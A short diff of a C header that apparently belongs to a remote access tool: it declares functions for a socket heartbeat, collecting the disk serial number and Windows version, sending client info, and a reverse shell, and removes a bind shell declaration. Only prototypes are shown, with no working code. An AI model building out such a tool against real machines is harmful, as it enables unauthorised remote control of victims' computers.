@@ -2,6 +2,8 @@
 
 #include "headers.h"
 
+string getLocalIP();
+
 void checkHeartBeat(SOCKET s);
 
 string getHDDSerialNumber();
@@ -10,6 +12,4 @@ string getWindowsVersion();
 
 void sendClientInfo(SOCKET s);
 
-void bindShell(char* ip, int port);
-
-void revShell(char* ip, int port);
+void revShell(char* ip);
